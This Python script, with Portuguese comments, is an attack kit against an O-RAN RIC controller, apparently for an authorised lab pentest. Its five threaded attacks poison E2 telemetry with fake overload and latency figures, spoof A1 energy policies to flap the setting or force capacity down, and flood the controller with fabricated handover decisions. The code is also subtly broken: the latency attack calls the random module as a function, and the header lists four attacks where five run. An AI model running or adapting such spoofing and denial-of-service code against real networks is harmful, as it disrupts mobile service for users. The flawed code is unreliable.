"""
atacar_oran.py - Kit de Ataque para O-RAN xApp e rApp
Autor: HackerAI / Pentest Autorizado
Alvo: RIC Mestre (ric_mestre.py) nas portas 8080

ATACA:
    1. xApp - Overload Fabricate: envenena dados de telemetria E2
    2. xApp - Latency Poison: workers comprometidos reportam latencia alta
    3. rApp - Energy Policy Injection: força politica A1 alternando rapido
    4. rApp - Resource Drain: faz RIC reduzir capacity para 50%
"""

import threading
import urllib.request
import json
import time
import random
import socket
import sys

# ===== CONFIG =====
RIC_HOST = sys.argv[1] if len(sys.argv) > 1 else "ric-service"
RIC_PORT = sys.argv[2] if len(sys.argv) > 2 else "8080"
BASE_URL = f"http://{RIC_HOST}:{RIC_PORT}"

print("=" * 60)
print("  ORAN ATTACK KIT - Atacando xApp e rApp")
print(f"  Alvo: {BASE_URL}")
print("=" * 60)

# ============================================================
# ATAQUE 1: OVERLOAD FABRICATE (contra o xApp)
# ============================================================
# O xApp le os dados GET do RIC e decide HANDOVER se load > capacity
# Nosso ataque: poe load sempre >200 para forçar HANDOVER em toda celula
def attack_xapp_overload_fabricate():
    """Envenena a resposta GET que o xApp consome"""
    print("[+] Ataque 1 iniciado: OVERLOAD FABRICANTE (xApp)")

    while True:
        try:
            # Simula uma requisicao de telemetria falsa
            # O xApp faz GET em /, entao a gente nao mexe nisso direto
            # Mas podemos enviar POST com dados falsos que o xApp vai ler

            # Injeta metricas falsas de worker comprometido
            fake_metrics = {
                "id": f"worker-comprometido-{random.randint(100,999)}",
                "latency_ms": round(random.uniform(1, 5), 2),  # Latencia baixa pra nao levantar suspeita
                "type": "benchmark",
                "cell_load_mbps": random.randint(220, 280),  # <-- Load FALSO >200!
                "cell_capacity_mbps": 100,
                "connected_users": random.randint(8, 18),  # Poucos usuarios (inconsistente)
                "status": "overload"
            }

            data_bytes = json.dumps(fake_metrics).encode('utf-8')
            req = urllib.request.Request(BASE_URL, data=data_bytes, method="POST")
            req.add_header('Content-Type', 'application/json')
            with urllib.request.urlopen(req, timeout=2) as r:
                pass

            time.sleep(0.3) # 3x por segundo

        except Exception as e:
            print(f"[xApp-Overload] Erro: {e}")
            time.sleep(1)

# ============================================================
# ATAQUE 2: LATENCY POISON (contra o xApp via workers)
# ============================================================
# O xApp le as latencias reportadas pelos workers
# Ataque: worker 0 reporta latencia altissima (>1000ms)

def attack_xapp_latency_poison():
    """Simula worker comprometido com latencia altissima"""
    print("[+] Ataque 2 iniciado: LATENCY POISON (xApp via workers)")

    while True:
        try:
            worker_id = random.choice([
                "bench-worker-0", "bench-worker-1", 
                "bench-worker-2", "bench-worker-3"
            ])

            # 70% de chance: latencia normal (pra se esconder)
            # 30% de chance: latencia altissima (o ataque)
            if random() < 0.3:
                latency = round(random.uniform(800, 3000), 2) # Alta! >800ms
            else:
                latency = round(random.gauss(12, 3), 2) # Normal ~12ms

            poison_data = {
                "id": worker_id,
                "latency_ms": latency,
                "type": "benchmark"
            }

            data_bytes = json.dumps(poison_data).encode('utf-8')
            req = urllib.request.Request(BASE_URL, data=data_bytes, method="POST")
            req.add_header('Content-Type', 'application/json')
            with urllib.request.urlopen(req, timeout=2) as r:
                pass

            time.sleep(0.5)

        except Exception as e:
            print(f"[xApp-Latency] Erro: {e}")
            time.sleep(1)

# ============================================================
# ATAQUE 3: ENERGY POLICY INJECTION (contra o rApp)
# ============================================================
# O rApp envia PUT com A1_POLICY para ativar/desativar economia
# Nosso ataque: injecta politica toda hora, forçando capacity=80
# mas alternando True/False rapidamente para instabilidade
def attack_rapp_energy_toggle():
    """Forca politica A1 alternando rapidamente - instabilidade"""
    print("[+] Ataque 3 iniciado: ENERGY POLICY INJECTION (rApp)")
    
    toggle = False
    while True:
        try:
            toggle = not toggle
            
            # Injeta politica falsa como se fosse o rApp legitimo
            fake_policy = {
                "type": "A1_POLICY",
                "scope": "UE_GROUP_1",
                "value": toggle,  # Alterna True/False a cada 2s
                "attacker": "true",
                "reason": "ENERGY_SAVING_OVERRIDE"
            }
            
            data_bytes = json.dumps(fake_policy).encode('utf-8')
            req = urllib.request.Request(BASE_URL, data=data_bytes, method="PUT")
            req.add_header('Content-Type', 'application/json')
            with urllib.request.urlopen(req, timeout=2) as r:
                print(f"  [rApp-Energy] Politica injetada: Economia={toggle}")
            
            time.sleep(2)  # Muda a cada 2 segundos (instabilidade!)
            
        except Exception as e:
            print(f"[rApp-Energy] Erro: {e}")
            time.sleep(1)

# ============================================================
# ATAQUE 4: RESOURCE DRAIN (contra o rApp, indireto no xApp)
# ============================================================
# Força o RIC a definir capacity=50 (minimo via politica)
# Isso faz o xApp enxergar 100% de utilizacao mais facilmente
def attack_rapp_resource_drain():
    """Forca capacity minima - degradacao de servico"""
    print("[+] Ataque 4 iniciado: RESOURCE DRAIN (rApp -> xApp)")
    
    time.sleep(30)  # Espera os outros ataques comecarem
    
    while True:
        try:
            # Politica forcando economia agressiva (capacity cai para 50)
            drain_policy = {
                "type": "A1_POLICY",
                "scope": "UE_GROUP_ALL",
                "value": True,  # Ativa economia
                "severity": "critical",
                "capacity_override": 50,  # Força capacity para 50!
                "attacker": "true"
            }
            
            data_bytes = json.dumps(drain_policy).encode('utf-8')
            req = urllib.request.Request(BASE_URL, data=data_bytes, method="PUT")
            req.add_header('Content-Type', 'application/json')
            with urllib.request.urlopen(req, timeout=2) as r:
                print(f"  [rApp-Drain] Capacity forcado para 50!")
            
            time.sleep(15)  # A cada 15s reforca o ataque
            
        except Exception as e:
            print(f"[rApp-Drain] Erro: {e}")
            time.sleep(5)

# ============================================================
# ATAQUE 5: MASSIVE HANDOVER STORM (xApp + rApp combinado)
# ============================================================
# Explora a decisao do xApp: se load > capacity -> HANDOVER
# Injeta dados que fazem TODO trafego parecer >100% de utilizacao
def attack_massive_handover_storm():
    """Forca centenas de HANDOVER falsos - tempestade de handover"""
    print("[+] Ataque 5 iniciado: HANDOVER STORM (xApp + rApp)")
    
    time.sleep(15)  # Aguarda outros ataques
    
    # Lista de celulas falsas para simular multiplas celulas sobrecarregadas
    fake_cells = [f"gnb-{i:03d}" for i in range(1, 51)]  # 50 celulas
    
    while True:
        try:
            # Envia metricas de 10 celulas diferentes por vez
            for cell in random.sample(fake_cells, 10):
                handover_data = {
                    "id": f"xapp-traffic",
                    "decision": "HANDOVER",
                    "cell_id": cell,
                    "reason": "OVERLOAD_ATTACK",
                    "load_mbps": random.randint(180, 300),
                    "capacity_mbps": 100,
                    "utilization": f"{random.randint(180, 300)}%",
                    "timestamp": time.time()
                }
                
                data_bytes = json.dumps(handover_data).encode('utf-8')
                req = urllib.request.Request(BASE_URL, data=data_bytes, method="POST")
                req.add_header('Content-Type', 'application/json')
                with urllib.request.urlopen(req, timeout=2) as r:
                    pass
            
            print(f"  [HandoverStorm] 10 HANDOVER falsos enviados")
            time.sleep(2)
            
        except Exception as e:
            print(f"[HandoverStorm] Erro: {e}")
            time.sleep(1)

# ============================================================
# MAIN - Dispara todos os ataques em threads
# ============================================================
if __name__ == "__main__":
    print("\n[!] INICIANDO ATAQUE COMBINADO xApp + rApp\n")
    
    threads = [
        threading.Thread(target=attack_xapp_overload_fabricate, daemon=True),
        threading.Thread(target=attack_xapp_latency_poison, daemon=True),
        threading.Thread(target=attack_rapp_energy_toggle, daemon=True),
        threading.Thread(target=attack_rapp_resource_drain, daemon=True),
        threading.Thread(target=attack_massive_handover_storm, daemon=True),
    ]
    
    for t in threads:
        t.start()
    
    print("[+] Todos os ataques rodando em paralelo")
    print("[+] Pressione Ctrl+C para parar\n")
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Ataque interrompido pelo operador")
        sys.exit(0)